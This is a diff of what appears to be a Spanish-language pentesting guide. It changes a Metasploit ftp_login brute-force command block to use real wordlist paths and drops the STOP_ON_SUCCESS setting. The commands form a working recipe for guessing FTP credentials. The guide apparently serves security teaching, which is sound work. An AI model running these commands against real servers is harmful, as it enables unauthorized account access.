@@ -76,9 +76,8 @@ Puedes realizar un ataque de fuerza bruta usando un diccionario de usuarios y co
 ```
 use auxiliary/scanner/ftp/ftp_login
 set RHOSTS <IP>
-set USER_FILE /ruta/al/diccionario/usuarios.txt
-set PASS_FILE /ruta/al/diccionario/contraseñas.txt
-set STOP_ON_SUCCESS true
+set USER_FILE /usr/share/wordlist/metasploit/unix_users.txt
+set PASS_FILE /usr/share/wordlist/metasploit/unix_passwords.txt
 run
 ```
 
